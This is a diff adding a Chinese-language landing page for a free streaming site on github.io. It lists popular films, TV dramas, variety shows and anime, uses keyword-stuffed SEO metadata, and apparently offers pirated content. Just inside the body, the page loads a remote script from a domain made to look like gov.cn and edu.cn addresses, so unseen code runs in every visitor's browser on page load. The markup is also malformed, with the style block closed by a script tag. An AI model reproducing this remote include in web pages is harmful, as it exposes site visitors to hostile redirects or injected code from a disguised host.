@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>多多影视 - 高清电影电视剧在线观看_免费影视资源大全 | duoduoyingshi-zh.github.io</title>
+<meta name="description" content="多多影视(duoduoyingshi-zh.github.io)提供最新高清电影、热播电视剧、精彩综艺节目、日本动漫番剧免费在线观看，每日更新海量影视资源，访问官网 https://duoduoyingshi-zh.github.io">
+<meta name="keywords" content="多多影视,电影在线观看,电视剧免费看,综艺节目,动漫番剧,影视资源大全">
+<meta name="author" content="多多影视">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://duoduoyingshi-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",sans-serif;
+  background:#f4f6fa;color:#2b2b33;line-height:1.6;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+img{display:block;width:100%}
+
+/* Search hero */
+.search-hero{
+  background:linear-gradient(135deg,#0b3d91,#1976d2 55%,#42a5f5);
+  padding:52px 20px 60px;text-align:center;position:relative;overflow:hidden;
+}
+.search-hero::after{
+  content:"";position:absolute;right:-60px;top:-60px;width:220px;height:220px;
+  background:rgba(255,255,255,.07);border-radius:50%;
+}
+.search-hero::before{
+  content:"";position:absolute;left:-40px;bottom:-80px;width:180px;height:180px;
+  background:rgba(255,255,255,.05);border-radius:50%;
+}
+.sh-inner{position:relative;z-index:2;max-width:720px;margin:0 auto}
+.brand{font-size:2rem;font-weight:900;color:#fff;letter-spacing:2px;margin-bottom:6px}
+.brand span{color:#ffd54f}
+.slogan{color:rgba(255,255,255,.85);font-size:.92rem;margin-bottom:24px}
+.search-box{
+  display:flex;gap:8px;background:#fff;padding:8px;border-radius:40px;
+  box-shadow:0 8px 30px rgba(0,0,0,.18);
+}
+.search-box input{
+  flex:1;border:none;outline:none;padding:10px 16px;font-size:.95rem;border-radius:30px;
+}
+.search-box button{
+  border:none;background:#0b3d91;color:#fff;font-weight:700;
+  padding:10px 26px;border-radius:30px;cursor:pointer;font-size:.9rem;white-space:nowrap;
+}
+.search-box button:hover{background:#06327a}
+.hotwords{margin-top:16px;font-size:.78rem;color:rgba(255,255,255,.8)}
+.hotwords a{margin:0 6px;padding:2px 10px;background:rgba(255,255,255,.14);border-radius:12px;transition:.2s}
+.hotwords a:hover{background:rgba(255,255,255,.3);color:#fff}
+
+/* Dot nav */
+.dotnav{
+  max-width:1100px;margin:-26px auto 0;position:relative;z-index:5;
+  display:flex;justify-content:center;gap:10px;flex-wrap:wrap;padding:0 16px;
+}
+.dotnav a{
+  background:#fff;color:#333;padding:11px 24px;border-radius:30px;
+  font-size:.86rem;font-weight:600;box-shadow:0 4px 16px rgba(0,0,0,.1);
+  transition:.25s;display:flex;align-items:center;gap:6px;
+}
+.dotnav a:hover{transform:translateY(-3px);box-shadow:0 8px 22px rgba(0,0,0,.16)}
+.dotnav a.on{background:#0b3d91;color:#fff}
+
+/* Container */
+.wrap{max-width:1100px;margin:34px auto 0;padding:0 18px 60px}
+
+/* Section title */
+.sec-title{
+  display:flex;align-items:baseline;gap:10px;margin:38px 0 18px;
+  padding-bottom:10px;border-bottom:2px dashed #d5dae5;
+}
+.sec-title:first-child{margin-top:10px}
+.sec-title .no{
+  font-size:1.7rem;font-weight:900;color:#0b3d91;line-height:1;
+}
+.sec-title h2{font-size:1.25rem;font-weight:800;color:#1a1a2b}
+.sec-title .more{margin-left:auto;font-size:.78rem;color:#1976d2;font-weight:600}
+
+/* Rank list (numbers) */
+.rank li{
+  display:flex;align-items:center;gap:14px;background:#fff;border-radius:12px;
+  padding:12px 16px;margin-bottom:10px;box-shadow:0 2px 10px rgba(0,0,0,.05);
+  transition:.22s;cursor:pointer;
+}
+.rank li:hover{box-shadow:0 6px 20px rgba(0,0,0,.12);transform:translateX(4px)}
+.rank .idx{
+  width:32px;height:32px;border-radius:9px;background:#eef2f8;color:#0b3d91;
+  font-weight:900;font-size:1rem;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.rank li:nth-child(1) .idx{background:#ffd54f;color:#7a5c00}
+.rank li:nth-child(2) .idx{background:#c8cdd4;color:#444}
+.rank li:nth-child(3) .idx{background:#e6a15c;color:#6b3d10}
+.rank .tt{font-size:.92rem;font-weight:600;flex:1}
+.rank .tp{font-size:.76rem;color:#8892a4;white-space:nowrap}
+.rank .sc{font-size:.78rem;color:#e53935;font-weight:700;white-space:nowrap}
+
+/* Masonry */
+.masonry{column-count:2;column-gap:16px}
+.mcard{
+  break-inside:avoid;background:#fff;border-radius:14px;overflow:hidden;
+  margin-bottom:16px;box-shadow:0 2px 12px rgba(0,0,0,.06);transition:.28s;cursor:pointer;
+}
+.mcard:hover{box-shadow:0 10px 28px rgba(0,0,0,.16);transform:translateY(-3px)}
+.mcard img{border-radius:14px 14px 0 0;aspect-ratio:16/10;object-fit:cover}
+.mcard .mb{padding:12px 14px}
+.mcard .mb h3{font-size:.92rem;font-weight:700;margin-bottom:4px}
+.mcard .mb p{font-size:.76rem;color:#7a8294}
+
+/* Tag chips */
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
+.chips span{
+  font-size:.7rem;padding:3px 10px;border-radius:20px;background:#eaf1fb;color:#0b3d91;font-weight:600;
+}
+
+/* Footer */
+footer{
+  background:#0b1020;color:#9aa4b6;text-align:center;padding:34px 20px 26px;
+}
+footer .fname{color:#fff;font-size:1.2rem;font-weight:900;margin-bottom:10px}
+footer .fname span{color:#42a5f5}
+footer .flink{margin-bottom:16px}
+footer .flink a{font-size:.8rem;margin:0 10px;color:#c3cade;transition:.2s}
+footer .flink a:hover{color:#42a5f5}
+footer .furl{color:#ffd54f;font-weight:700;font-size:.95rem;margin:8px 0}
+footer p{font-size:.74rem;margin-bottom:4px}
+
+/* Mobile */
+@media(max-width:720px){
+  .search-hero{padding:36px 16px 52px}
+  .brand{font-size:1.55rem}
+  .search-box{flex-direction:column;padding:10px;border-radius:20px}
+  .search-box button{border-radius:20px}
+  .masonry{column-count:2;column-gap:10px}
+  .mcard{margin-bottom:10px}
+  .rank li{flex-wrap:wrap;gap:8px}
+  .rank .tp,.rank .sc{font-size:.7rem}
+}
+@media(max-width:460px){
+  .masonry{column-count:1}
+  .dotnav a{padding:9px 15px;font-size:.8rem}
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Search hero -->
+<div class="search-hero">
+  <div class="sh-inner">
+    <div class="brand">多多<span>影视</span></div>
+    <p class="slogan">海量高清影视资源 · 免费在线观看 · 每日持续更新</p>
+    <form class="search-box" onsubmit="return false">
+      <input type="text" placeholder="搜索电影、电视剧、综艺、动漫…">
+      <button type="submit">搜 索</button>
+    </form>
+    <div class="hotwords">
+      热搜：<a href="#">流浪地球2</a><a href="#">庆余年2</a><a href="#">凡人修仙传</a><a href="#">脱口秀大会</a><a href="#">鬼灭之刃</a>
+    </div>
+  </div>
+</div>
+
+<!-- Dot nav -->
+<nav class="dotnav">
+  <a href="#film" class="on">🎬 电影</a>
+  <a href="#tv">📺 电视剧</a>
+  <a href="#variety">🎤 综艺</a>
+  <a href="#anime">🎨 动漫</a>
+  <a href="#">📱 手机看</a>
+  <a href="#">📋 排行</a>
+</nav>
+
+<!-- Main -->
+<div class="wrap">
+
+  <!-- Film: rank list -->
+  <div class="sec-title" id="film">
+    <span class="no">01</span><h2>热门电影</h2><a href="#" class="more">更多 ›</a>
+  </div>
+  <ul class="rank">
+    <li><span class="idx">1</span><span class="tt">流浪地球2</span><span class="tp">科幻 / 冒险</span><span class="sc">9.2分</span></li>
+    <li><span class="idx">2</span><span class="tt">封神第二部：战火西岐</span><span class="tp">奇幻 / 动作</span><span class="sc">8.8分</span></li>
+    <li><span class="idx">3</span><span class="tt">第二十条</span><span class="tp">剧情 / 喜剧</span><span class="sc">8.5分</span></li>
+    <li><span class="idx">4</span><span class="tt">默杀</span><span class="tp">悬疑 / 犯罪</span><span class="sc">9.0分</span></li>
+    <li><span class="idx">5</span><span class="tt">飞驰人生2</span><span class="tp">喜剧 / 运动</span><span class="sc">8.7分</span></li>
+    <li><span class="idx">6</span><span class="tt">热辣滚烫</span><span class="tp">喜剧 / 励志</span><span class="sc">8.3分</span></li>
+    <li><span class="idx">7</span><span class="tt">头脑特工队2</span><span class="tp">动画 / 冒险</span><span class="sc">8.9分</span></li>
+    <li><span class="idx">8</span><span class="tt">海关战线</span><span class="tp">动作 / 犯罪</span><span class="sc">7.9分</span></li>
+  </ul>
+
+  <!-- TV: masonry cards -->
+  <div class="sec-title" id="tv">
+    <span class="no">02</span><h2>热播电视剧</h2><a href="#" class="more">更多 ›</a>
+  </div>
+  <div class="masonry">
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=51" alt="庆余年2" loading="lazy">
+      <div class="mb"><h3>庆余年2</h3><p>古装权谋巨制，范闲再入朝堂，权谋升级</p><div class="chips"><span>古装</span><span>权谋</span><span>全36集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=52" alt="与凤行" loading="lazy">
+      <div class="mb"><h3>与凤行</h3><p>上古神君与碧苍王，仙侠虐恋再掀波澜</p><div class="chips"><span>仙侠</span><span>爱情</span><span>更新28集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=53" alt="狂飙" loading="lazy">
+      <div class="mb"><h3>狂飙</h3><p>扫黑除恶二十年，正邪较量步步惊心</p><div class="chips"><span>刑侦</span><span>剧情</span><span>全39集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=54" alt="玫瑰的故事" loading="lazy">
+      <div class="mb"><h3>玫瑰的故事</h3><p>都市女性成长史，爱与自我的双向奔赴</p><div class="chips"><span>都市</span><span>情感</span><span>更新18集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=55" alt="琅琊榜" loading="lazy">
+      <div class="mb"><h3>琅琊榜</h3><p>赤焰冤案昭雪，梅长苏搅动朝堂风云</p><div class="chips"><span>古装</span><span>权谋</span><span>全54集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=56" alt="去有风的地方" loading="lazy">
+      <div class="mb"><h3>去有风的地方</h3><p>逃离都市喧嚣，在云南小镇找回生活本真</p><div class="chips"><span>治愈</span><span>田园</span><span>全40集</span></div></div>
+    </div>
+  </div>
+
+  <!-- Variety: rank list -->
+  <div class="sec-title" id="variety">
+    <span class="no">03</span><h2>综艺节目</h2><a href="#" class="more">更多 ›</a>
+  </div>
+  <ul class="rank">
+    <li><span class="idx">1</span><span class="tt">奔跑吧 特别季</span><span class="tp">户外竞技</span><span class="sc">第8期</span></li>
+    <li><span class="idx">2</span><span class="tt">我是歌手 2024</span><span class="tp">音乐竞演</span><span class="sc">第6期</span></li>
+    <li><span class="idx">3</span><span class="tt">脱口秀大会 第六季</span><span class="tp">喜剧脱口秀</span><span class="sc">第7期</span></li>
+    <li><span class="idx">4</span><span class="tt">向往的生活 慢生活</span><span class="tp">生活纪实</span><span class="sc">第10期</span></li>
+    <li><span class="idx">5</span><span class="tt">这！就是街舞 第六季</span><span class="tp">街舞竞技</span><span class="sc">决赛</span></li>
+    <li><span class="idx">6</span><span class="tt">中餐厅 第八季</span><span class="tp">美食经营</span><span class="sc">第9期</span></li>
+  </ul>
+
+  <!-- Anime: masonry cards -->
+  <div class="sec-title" id="anime">
+    <span class="no">04</span><h2>动漫番剧</h2><a href="#" class="more">更多 ›</a>
+  </div>
+  <div class="masonry">
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=71" alt="凡人修仙传" loading="lazy">
+      <div class="mb"><h3>凡人修仙传</h3><p>韩立踏上修仙之路，步步为营逆天而行</p><div class="chips"><span>修仙</span><span>国漫</span><span>156集</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=72" alt="灵笼" loading="lazy">
+      <div class="mb"><h3>灵笼</h3><p>末日废土之上，人类最后的生存之战</p><div class="chips"><span>末日</span><span>科幻</span><span>第2季</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=73" alt="鬼灭之刃" loading="lazy">
+      <div class="mb"><h3>鬼灭之刃</h3><p>炭治郎斩鬼救妹，热血与羁绊交织</p><div class="chips"><span>热血</span><span>日漫</span><span>锻刀村篇</span></div></div>
+    </div>
+    <div class="mcard">
+      <img src="https://picsum.photos/400/250?random=74" alt="完美世界" loading="lazy">
+      <div class="mb"><h3>完美世界</h3><p>荒天帝独断万古，少年石昊的逆天传奇</p><div class="chips"><span>玄幻</span><span>国漫</span><span>189集</span></div></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Footer -->
+<footer>
+  <div class="fname">多多<span>影视</span></div>
+  <div class="flink">
+    <a href="#film">电影</a><a href="#tv">电视剧</a><a href="#variety">综艺</a><a href="#anime">动漫</a><a href="#">排行榜</a><a href="#">更新日志</a><a href="#">关于我们</a><a href="#">免责声明</a>
+  </div>
+  <p class="furl">多多影视 官网地址：https://duoduoyingshi-zh.github.io</p>
+  <p>© 2024 多多影视 duoduoyingshi-zh.github.io 版权所有</p>
+  <p>本站资源均来自互联网公开内容，仅供交流学习，请勿用于商业用途</p>
+</footer>
+
+</body>
+</html>
